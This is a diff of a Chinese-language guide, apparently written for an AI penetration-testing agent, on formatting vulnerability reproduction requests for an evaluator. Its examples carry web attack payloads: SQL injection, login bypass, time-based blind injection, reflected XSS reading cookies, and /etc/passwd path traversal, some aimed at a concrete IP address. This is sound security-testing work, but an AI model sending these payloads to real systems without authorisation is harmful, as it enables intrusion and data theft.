@@ -141,132 +141,343 @@ tier: medium
 
 当发现潜在漏洞时，使用 `write_observation` 记录假设，供评估者验证。
 
-**核心规范**：
-1. **traffic_id 必须真实存在**
-   - ⚠️ **禁止猜测 ID**：不要填写 `1`、`0` 等默认值
-   - ✅ **正确做法**：先调用 `list_traffic(source="agent")` 查看主动扫描产生的流量
-   - ✅ **选择匹配的流量**：根据 URL、method 选择与测试目标相符的流量 ID
+**核心原则**：repro 必须是**自包含的完整验证配方**，包含 Evaluator 重放验证所需的全部信息。
 
-2. **正确的工作流程**：
-   ```
-   步骤1: 使用 http_request/browser_use 发送测试请求
-   步骤2: 调用 list_traffic(source="agent", limit=20) 查询刚才产生的流量
-   步骤3: 从结果中找到目标 URL 对应的流量（如 id=75）
-   步骤4: 调用 write_observation 时使用真实的 id：
-          repro={
-            traffic_id: 75,  # ← 使用步骤3查到的真实ID
-            modifications: {...},
-            assert: {...}
-          }
-   ```
+## repro 结构
 
-3. **错误示例（会导致验证失败）**：
-   ```json
-   {
-     "traffic_id": 1,  // ❌ 错误：凭空猜测的ID
-     "modifications": {...}
-   }
-   ```
-
-4. **正确示例**：
-   ```json
-   // 步骤1: 发送测试请求
-   http_request({url: "http://target.com/login", method: "POST", ...})
-   
-   // 步骤2: 查询刚才产生的流量
-   list_traffic({source: "agent", limit: 10}) 
-   // 返回: [{id: 75, source: "agent", url: "http://target.com/login", ...}]
-   
-   // 步骤3: 使用查到的真实ID
-   write_observation({
-     statement: "存在SQL注入",
-     repro: {
-       traffic_id: 75,  // ✅ 正确：使用真实ID
-       modifications: {
-         body_fields: {"username": "admin' OR '1'='1"}
-       },
-       assert: {
-         body_contains: ["database error", "SQL syntax"]
-       }
-     }
-   })
-   ```
-
-**为什么 traffic_id 不能猜测？**
-- 流量 ID 是数据库自增主键，不是从 1 开始的连续序列
-- 可能有流量被删除，导致 ID 不连续（如实际从 75 开始）
-- 错误的 ID 会导致评估者无法复现，浪费验证资源
-
-### modifications：payload 注入点
-
-`modifications` 字段指定如何修改原始流量来注入 payload。**关键规范**：
-
-**❌ 错误做法：把 payload 直接放到 URL 中**
 ```json
 {
-  "modifications": {
-    "url": "http://target.com/api' UNION SELECT 1,2,3--"  // ❌ 会导致 URL 解析失败
-  }
-}
-```
-
-**✅ 正确做法：根据注入点选择合适的字段**
-
-1. **Query 参数注入**（GET 请求）：
-```json
-{
-  "modifications": {
-    "query": {
-      "id": "1' OR '1'='1",           // SQL 注入
-      "search": "<script>alert(1)</script>"  // XSS
+  "statement": "漏洞描述",
+  "repro": {
+    "request": {           // 必需：完整的 HTTP 请求
+      "method": "GET",
+      "url": "http://...",
+      "headers": {...},
+      "body": ""
+    },
+    "assert": {            // 必需：验证条件
+      "status_code": 200,
+      "body_contains": [...],
+      "body_not_contains": [...],
+      "min_duration_ms": 5000
     }
   }
 }
 ```
 
-2. **Body 表单注入**（POST application/x-www-form-urlencoded）：
+**必需字段**：
+- `repro.request`: 完整的 HTTP 请求（method, url, headers, body）
+- `repro.assert`: 验证漏洞存在的断言条件
+
+## 正确的工作流程
+
+### 步骤 1: 发送测试请求
+
+使用 `http_request` 工具发送请求，它返回完整的请求和响应信息：
+
+```javascript
+const resp = http_request({
+  url: "http://target.com/api?id=1",
+  method: "GET",
+  headers: {"User-Agent": "Mozilla/5.0..."}
+});
+
+// 返回值结构：
+{
+  "traffic_id": 123,
+  "request": {
+    "method": "GET",
+    "url": "http://target.com/api?id=1",
+    "headers": {"User-Agent": "Mozilla/5.0..."},
+    "body": ""
+  },
+  "response": {
+    "status_code": 200,
+    "headers": {"Content-Type": "text/html"},
+    "body": "user info...",
+    "duration_ms": 234
+  }
+}
+```
+
+### 步骤 2: 构造漏洞验证请求
+
+基于正常请求，修改 URL/headers/body 注入 payload，定义验证条件：
+
+```javascript
+write_observation({
+  statement: "存在 SQL 注入漏洞",
+  repro: {
+    request: {
+      method: "GET",
+      url: "http://target.com/api?id=1' OR '1'='1",  // 注入 SQL payload
+      headers: resp.request.headers,                  // 复用原请求的 headers
+      body: ""
+    },
+    assert: {
+      status_code: 200,
+      body_contains: ["admin", "password", "email"]   // 期望泄露敏感数据
+    }
+  }
+});
+```
+
+## 完整示例
+
+### 示例 1：SQL 注入（GET 参数）
+
 ```json
 {
-  "modifications": {
-    "body_fields": {
-      "username": "admin' OR '1'='1",
-      "password": "anything"
+  "statement": "GET 参数 id 存在 SQL 注入，可枚举数据库",
+  "repro": {
+    "request": {
+      "method": "GET",
+      "url": "http://111.229.193.40:34280/Less-1/?id=1' UNION SELECT 1,database(),version()--+",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"
+      },
+      "body": ""
+    },
+    "assert": {
+      "status_code": 200,
+      "body_contains": ["security", "5."]  // 期望看到数据库名和版本号
     }
   }
 }
 ```
 
-3. **Body JSON 注入**（POST application/json）：
+### 示例 2：SQL 注入（POST 表单）
+
 ```json
 {
-  "modifications": {
-    "body": "{\"username\": \"admin' OR '1'='1\", \"password\": \"test\"}"
+  "statement": "登录表单存在 SQL 注入，可绕过认证",
+  "repro": {
+    "request": {
+      "method": "POST",
+      "url": "http://target.com/login",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Cookie": "session=abc123"
+      },
+      "body": "username=admin' OR '1'='1'--&password=anything"
+    },
+    "assert": {
+      "status_code": 302,
+      "body_contains": ["dashboard", "welcome"]
+    }
   }
 }
 ```
 
-4. **Header 注入**：
+### 示例 3：XSS（反射型）
+
 ```json
 {
-  "modifications": {
+  "statement": "搜索功能存在反射型 XSS",
+  "repro": {
+    "request": {
+      "method": "GET",
+      "url": "http://target.com/search?q=<script>alert(document.cookie)</script>",
+      "headers": {},
+      "body": ""
+    },
+    "assert": {
+      "status_code": 200,
+      "body_contains": ["<script>alert(document.cookie)</script>"]
+    }
+  }
+}
+```
+
+### 示例 4：时间盲注
+
+```json
+{
+  "statement": "存在 SQL 时间盲注",
+  "repro": {
+    "request": {
+      "method": "GET",
+      "url": "http://target.com/api?id=1' AND SLEEP(5)--",
+      "headers": {},
+      "body": ""
+    },
+    "assert": {
+      "min_duration_ms": 5000  // 期望响应延迟至少 5 秒
+    }
+  }
+}
+```
+
+### 示例 5：路径穿越
+
+```json
+{
+  "statement": "文件下载功能存在路径穿越",
+  "repro": {
+    "request": {
+      "method": "GET",
+      "url": "http://target.com/download?file=../../../../etc/passwd",
+      "headers": {},
+      "body": ""
+    },
+    "assert": {
+      "status_code": 200,
+      "body_contains": ["root:x:0:0", "/bin/bash"]
+    }
+  }
+}
+```
+
+## 常见错误
+
+### ❌ 错误 1：使用相对路径或不完整的 URL
+
+```json
+{
+  "request": {
+    "url": "/.hidden"  // ❌ 缺少 scheme 和 host
+  }
+}
+```
+
+✅ **正确**：使用完整 URL
+```json
+{
+  "request": {
+    "url": "http://111.229.193.40:34280/.hidden"
+  }
+}
+```
+
+### ❌ 错误 2：assert 条件太弱
+
+```json
+{
+  "assert": {
+    "status_code": 200  // ❌ 正常请求也返回 200，无鉴别力
+  }
+}
+```
+
+✅ **正确**：使用有鉴别力的条件
+```json
+{
+  "assert": {
+    "status_code": 200,
+    "body_contains": ["SQL syntax error", "mysql_fetch"]  // 只有 SQL 注入才会出现
+  }
+}
+```
+
+### ❌ 错误 3：缺少必要的 headers
+
+```json
+{
+  "request": {
+    "method": "POST",
+    "body": "username=admin&password=123",
+    "headers": {}  // ❌ 缺少 Content-Type
+  }
+}
+```
+
+✅ **正确**：包含必要的 headers
+```json
+{
+  "request": {
+    "method": "POST",
+    "body": "username=admin&password=123",
     "headers": {
-      "User-Agent": "' OR '1'='1",
-      "X-Forwarded-For": "127.0.0.1"
+      "Content-Type": "application/x-www-form-urlencoded"
     }
   }
 }
 ```
 
-5. **URL 路径注入**（仅当需要修改路径本身）：
+## 从 http_request 结果构造 repro 的技巧
+
+**场景**：你发送了一个正常请求，现在要构造漏洞验证请求
+
+```javascript
+// 1. 发送正常请求，观察行为
+const normal = http_request({
+  url: "http://target.com/api?id=1",
+  method: "GET"
+});
+// 响应：{"user": "alice", "role": "user"}
+
+// 2. 构造注入请求：复用 request，修改 URL 注入 payload
+write_observation({
+  statement: "参数 id 存在 SQL 注入",
+  repro: {
+    request: {
+      method: normal.request.method,           // 复用 method
+      url: "http://target.com/api?id=1' UNION SELECT 'admin','admin'--",  // 修改 URL
+      headers: normal.request.headers,         // 复用 headers
+      body: normal.request.body                // 复用 body
+    },
+    assert: {
+      status_code: 200,
+      body_contains: ["admin", "admin"]        // 期望注入的值出现在响应中
+    }
+  }
+});
+```
+
+## assert 断言条件指南
+
+### 可用的断言字段
+
+- `status_code`: 期望的 HTTP 状态码（如 200, 403, 500）
+- `body_contains`: 响应体必须包含的字符串列表（全部满足）
+- `body_not_contains`: 响应体不应包含的字符串列表（全部不满足）
+- `min_duration_ms`: 最小响应时间（用于时间盲注）
+
+### 如何编写有效的 assert
+
+**原则**：assert 应该**只在漏洞存在时才满足**
+
+✅ **好的 assert**：
+- SQL 注入：`body_contains: ["SQL syntax", "mysql_fetch", "ORA-"]`
+- XSS：`body_contains: ["<script>alert(1)</script>"]`（payload 被反射）
+- 信息泄露：`body_contains: ["password", "email", "admin"]`
+- 时间盲注：`min_duration_ms: 5000`
+
+❌ **坏的 assert**：
+- `status_code: 200`（正常请求也可能返回 200）
+- `body_contains: ["error"]`（太宽泛，很多非漏洞情况也会有 error）
+
+### 组合多个条件提高准确性
+
 ```json
 {
-  "modifications": {
-    "url": "http://target.com/api/users/../../etc/passwd"  // 路径穿越
+  "assert": {
+    "status_code": 200,
+    "body_contains": ["admin", "password", "root"],  // 三个条件都要满足
+    "body_not_contains": ["login required"]          // 且不包含未授权提示
   }
 }
 ```
 
-**规则**：
-- ✅ payload 放在参数值中（query、body_fields、headers）
-- ❌ 不要把 SQL/XSS payload 直接拼接到 URL 中
-- ✅ 只在需要修改完整 URL（如路径穿越、SSRF）时才使用 `modifications.url`
+## 注意事项
+
+1. **URL 必须完整**：包含 scheme (http/https) + host + path + query
+2. **headers 是可选的**：如果不需要特殊 headers，可以传空对象 `{}`
+3. **body 对于 GET 请求通常为空字符串** `""`
+4. **assert 至少要有一个条件**：不能为空对象
+5. **复用 http_request 的返回值**：避免手写可能出错
+
+## 为什么不使用 traffic_id + modifications？
+
+旧的设计（traffic_id + modifications）存在问题：
+- ❌ 依赖数据库中的流量记录
+- ❌ modifications 不完整（如只有路径，缺少 host）
+- ❌ Evaluator 需要复杂的"应用 modifications"逻辑
+- ❌ 无法导出为其他工具的格式
+
+新的设计（完整 request）的优势：
+- ✅ 自包含，不依赖外部状态
+- ✅ 可移植，可以导出为 curl、Python 脚本
+- ✅ Evaluator 只需机械重放，无需理解或推理
+- ✅ 人类可读，易于验证
+
